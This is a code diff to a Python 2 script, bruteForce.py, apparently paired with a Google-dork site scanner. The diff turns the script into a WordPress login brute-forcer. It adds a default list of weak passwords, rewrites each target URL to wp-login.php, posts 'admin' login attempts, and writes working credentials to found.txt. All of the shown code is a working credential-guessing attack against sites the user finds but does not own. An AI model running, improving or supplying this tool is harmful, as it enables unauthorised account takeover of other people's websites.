@@ -8,6 +8,7 @@ dorkScanner.py, find sites from dorks.
 
 Usage:
 	~$ python2 bruteForce.py sites.txt pwds.txt
+	~$ python2 bruteForce.py sites.txt          # Use default passwords
 
 	// Brute force process will be started"
 """
@@ -18,32 +19,48 @@ __date__   = "16.04.2017"
 import sys
 import requests
 
-found = []
+found     = []
+file      = open("found.txt", "a")
+passwords = ["admin", "demo", "demo123", "password", "password123", "qwerty", "qwerty123",
+			 "administrator", "root", "pass", "pass123", "123456789"]
 
-def brute(site, password):
+def brute(site, username="admin", control=False):
 	''' Try login to site with username:password '''
 
-	try:
-		payload = {"log": "admin", "pwd": password}
-		text = requests.post(site, data=payload, timeout=5)
+	for pwd in passwords:
+		try:
+			payload = {"log": "admin", "pwd": pwd}
+			req = requests.post(site, data=payload, timeout=5)
 
-		if "dashboard" in text:
-			print "\n"+"-*60"+"[+] Site: %s\n\t[*] Username:%s\n\t[*] Password: %s\n"%(site, username, password) + "-"*60
-			found.append((site, username, password))
+			if "dashboard" in req.text:
+				if control != False:
+					print "[+] Site: %s\n\t[*] Username: %s\n\t[*] Password: %s\n%s\n"%(site, username, pwd, "-"*60)
+				else:
+					pass
+				file.write("[+] Site: %s\n\t[*] Username: %s\n\t[*] Password: %s\n%s\n"%(site, username, pwd, "-"*60))
+				file.flush()
+				found.append((site, username, pwd))
+				return
+
+		except:
 			return
-	except:
-		return
 
 
 if __name__ == '__main__':
 	''' When script runs directly '''
-	try:
+
+	if len(sys.argv) == 3:
 		sites     = open(sys.argv[1], "r").read().split("\n")
 		passwords = open(sys.argv[2], "r").read().split("\n")
-	except Exception as error:
-		print "[!] Error: ", error
+
+	elif len(sys.argv) == 2:
+		sites = open(sys.argv[1], "r").read().split("\n")
+
+	else:
+		sys.exit()
 
 	for site in sites:
+		site = "http://" + site.split("/")[2] + "/wp-login.php" # re formatting url for test :)
+
 		print "[-] Trying: ", site
-		for pwd in passwords:
-			brute(site, pwd)
+		brute(site, control=True)
